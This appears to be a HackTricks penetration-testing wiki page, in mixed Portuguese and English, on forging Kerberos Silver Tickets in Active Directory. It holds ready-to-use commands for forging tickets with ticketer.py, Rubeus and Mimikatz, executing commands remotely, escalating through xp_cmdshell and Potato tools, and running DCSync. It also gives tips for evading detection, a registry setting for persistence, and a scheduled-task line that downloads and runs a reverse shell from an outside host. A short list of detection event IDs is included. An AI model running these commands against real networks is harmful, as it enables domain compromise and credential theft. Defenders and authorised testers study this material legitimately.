# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

O ataque **Silver Ticket** envolve a exploração de service tickets em ambientes Active Directory (AD). Este método depende de **obter o hash NTLM de uma conta de serviço**, como uma conta de computador, para forjar um Ticket Granting Service (TGS). Com este ticket forjado, um atacante pode acessar serviços específicos na rede, **se passando por qualquer usuário**, normalmente visando privilégios administrativos. Enfatiza-se que usar chaves AES para forjar tickets é mais seguro e menos detectável.

> [!WARNING]
> Silver Tickets são menos detectáveis que Golden Tickets porque exigem apenas o **hash da conta de serviço**, não a conta krbtgt. No entanto, eles são limitados ao serviço específico que visam. Além disso, apenas roubar a senha de um usuário.
Além disso, se você comprometer a **senha de uma conta com um SPN** você pode usar essa senha para criar um Silver Ticket se passando por qualquer usuário para esse serviço.

### Modern Kerberos changes (AES-only domains)

- Windows updates starting **8 Nov 2022 (KB5021131)** default service tickets to **AES session keys** when possible and are phasing out RC4. DCs are expected to ship with RC4 **disabled by default by mid‑2026**, so relying on NTLM/RC4 hashes for silver tickets increasingly fails with `KRB_AP_ERR_MODIFIED`. Always extract **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) for the target service account.
- If the service account `msDS-SupportedEncryptionTypes` is restricted to AES, you must forge with `/aes256` or `-aesKey`; RC4 (`/rc4` or `-nthash`) will not work even if you hold the NTLM hash.
- gMSA/computer accounts rotate every 30 days; dump the **current AES key** from LSASS, Secretsdump/NTDS, or DCsync before forging.
- OPSEC: default ticket lifetime in tools is often **10 years**; set realistic durations (e.g., `-duration 600` minutes) to avoid detection by abnormal lifetimes.

For ticket crafting, different tools are employed based on the operating system:

### No Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### No Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
O serviço CIFS é destacado como um alvo comum para acessar o sistema de arquivos da vítima, mas outros serviços como HOST e RPCSS também podem ser explorados para tarefas e consultas WMI.

### Exemplo: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Se você tem o NTLM hash (ou AES key) de uma conta de serviço SQL (por exemplo, sqlsvc) você pode forjar um TGS para o MSSQL SPN e impersonate qualquer usuário para o serviço SQL. A partir daí, ative xp_cmdshell para executar comandos como a conta de serviço SQL. Se esse token tiver SeImpersonatePrivilege, encadeie um Potato para elevar para SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Se o contexto resultante tiver SeImpersonatePrivilege (frequentemente verdadeiro para service accounts), use uma variante do Potato para obter SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
More details on abusing MSSQL and enabling xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques overview:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Serviços Disponíveis

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets IDs de Evento

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- **No preceding 4768/4769 on the DC** for the same client/service is a common indicator of a forged TGS being presented directly to the service.
- Abnormally long ticket lifetime or unexpected encryption type (RC4 when domain enforces AES) also stand out in 4769/4624 data.

## Persistência

Para evitar que as máquinas rotacionem sua senha a cada 30 dias, defina `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ou você pode definir `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` para um valor maior que 30 dias para indicar o período de rotação em que a senha da máquina deve ser rotacionada.

## Abusando de tickets de serviço

In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.

### CIFS

With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Você também poderá obter um shell dentro do host ou executar comandos arbitrários usando **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Com essa permissão você pode gerar tarefas agendadas em computadores remotos e executar comandos arbitrários:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Com esses tickets você pode **executar WMI no sistema da vítima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Encontre **mais informações sobre wmiexec** na seguinte página:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Com acesso winrm a um computador você pode **acessá-lo** e até obter um PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consulte a página a seguir para aprender **mais maneiras de conectar-se a um host remoto usando winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Observe que **winrm deve estar ativo e ouvindo** no computador remoto para acessá-lo.

### LDAP

Com esse privilégio você pode dump the DC database usando **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Saiba mais sobre DCSync** na página a seguir:

{{#ref}}
dcsync.md
{{#endref}}


## Referências

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)



{{#include ../../banners/hacktricks-training.md}}
